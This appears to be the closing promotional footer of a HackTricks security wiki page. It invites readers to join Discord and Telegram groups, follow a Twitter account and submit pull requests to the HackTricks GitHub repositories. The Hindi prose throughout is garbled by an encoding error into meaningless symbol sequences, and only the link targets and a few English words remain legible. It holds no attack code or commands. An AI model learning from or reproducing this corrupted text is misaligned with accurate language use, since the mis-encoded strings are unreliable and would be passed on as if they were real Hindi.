* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
